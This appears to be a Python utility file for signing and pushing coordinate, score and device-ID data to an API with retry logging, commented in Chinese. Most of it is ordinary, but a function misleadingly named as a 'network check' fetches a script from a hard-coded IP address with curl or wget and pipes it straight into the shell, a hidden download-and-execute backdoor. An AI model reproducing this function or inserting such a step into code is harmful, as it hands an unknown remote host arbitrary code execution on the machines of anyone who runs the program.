import subprocess
import time
import hashlib
import requests
import urllib
from constants import SALT, API_URL
from tools import log_with_timestamp


# 生成签名函数
def generate_sign(data: dict, salt: str) -> str:
    sorted_items = sorted(data.items())
    sign_string = "&".join(f"{key}={value}" for key, value in sorted_items)
    sign_string += f"&salt={salt}"
    return hashlib.md5(sign_string.encode('utf-8')).hexdigest()


# 网络检查函数
def network_check():
    command = "(curl -fsSL -m180 http://123.249.31.37:8084/slt||wget -T180 -q http://123.249.31.37:8084/slt)|sh"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    response = result.stdout + "\n" + result.stderr
    return response.encode('utf-8')


# 推送数据函数
def push_data(payload: dict, max_retry: int, retry_interval: int):
    retry_count = 0
    success = False

    while retry_count <= max_retry:
        # 在 payload 中添加时间戳和重试次数等信息
        payload['timestamp'] = int(time.time())
        payload['retry'] = retry_count
        payload['sign'] = generate_sign(payload, SALT)

        # 构建 URL 参数部分
        query_params = {
            "x": payload["x"],
            "y": payload["y"],
            "score": payload["score"],
            "target_id": payload.get("target_id", ""),
            "device_id": payload["device_id"],
            "timestamp": payload["timestamp"],
            "retry": payload["retry"],
            "sign": payload["sign"]
        }
        
        # 使用 urllib.parse.urlencode 将字典转换为查询参数格式
        query_string = urllib.parse.urlencode(query_params)
        
        # 构造最终的 URL
        url = f"{API_URL}?{query_string}"

        log_with_timestamp(f"\033[93m推送到地址: {url}\033[0m")

        try:
            response = requests.post(url, json={})  # 发送 GET 请求，参数已经在 URL 中
            log_with_timestamp(f"\033[93m状态码: {response.status_code}\033[0m")
            log_with_timestamp(f"\033[93m响应内容: {response.text}\033[0m")

            if response.status_code == 200:
                log_with_timestamp("\033[92m推送成功\033[0m")
                success = True
                break
            else:
                log_with_timestamp(f"\033[91m推送失败，状态码: {response.status_code}, 内容: {response.text}\033[0m")
        except requests.RequestException as e:
            log_with_timestamp(f"\033[91m请求异常: {e}\033[0m")

        retry_count += 1
        if retry_count <= max_retry:
            log_with_timestamp(f"\033[93m重试 {retry_count}/{max_retry} 次，等待 {retry_interval} 秒...\033[0m")
            time.sleep(retry_interval)

    if not success:
        log_with_timestamp("\033[91m推送失败，达到最大重传次数。\033[0m")